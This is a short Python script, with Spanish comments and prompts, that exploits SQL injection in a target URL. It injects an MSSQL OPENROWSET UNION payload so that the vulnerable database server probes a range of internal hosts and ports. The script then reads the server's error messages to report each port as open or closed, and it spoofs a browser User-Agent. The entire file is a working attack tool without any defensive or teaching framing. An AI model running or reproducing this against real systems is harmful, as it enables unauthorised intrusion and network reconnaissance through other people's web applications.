import requests
import sys

if len(sys.argv) < 8:
    print ("Introduce los siguientes parámetros: <start host> <end host> <start port> <end port> <timeout> <url> <method>")
    sys.exit(0)
else:
    start_host = sys.argv[1]
    end_host   = sys.argv[2]
    start_port = int(sys.argv[3])
    end_port   = int(sys.argv[4])
    timeout    = int(sys.argv[5])
    url        = sys.argv[6]
    method     = sys.argv[7]

headers = {'User-Agent' : 'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)'}

# Convertir las direcciones IP a números para iterar sobre ellas
start_host_num = list(map(int, start_host.split('.')))
end_host_num = list(map(int, end_host.split('.')))

for i in range(start_host_num[3], end_host_num[3] + 1):
    host = '.'.join(map(str, start_host_num[:3] + [i]))
    for port in range(start_port, end_port + 1):
        query = "1 UNION SELECT NULL,NULL,NULL,NULL,* FROM OPENROWSET('SQLoledb','Network=DBMSSOCN;Address=" + host + "," + str(port) + ";uid=uid;pwd=password','SELECT 1')"
        url_query = url + requests.utils.quote(query)
        try:
            if method.lower() == 'get':
                res = requests.get(url_query, headers=headers, timeout=timeout)
            elif method.lower() == 'post':
                res = requests.post(url_query, headers=headers, timeout=timeout)
            else:
                print("Método no soportado: " + method)
                sys.exit(0)
            response = res.text
            if 'Client unable to establish connection due to prelogin failure' in response or 'Protocol error in TDS stream' in response:
                print ("Host: " + host + " Port: " + str(port) + " OPEN")
            elif 'Login timeout expired' in response:
                print ("Host: " + host + " Port: " + str(port) + " CLOSED or UNREACHABLE")
            else:
                print ("Host: " + host + " Port: " + str(port) + " UNKNOWN RESPONSE")
        except Exception as e:
            print ("Host: " + host + " Port: " + str(port) + " CLOSED/NOT REACHED")
            print ("Exception: ", e)

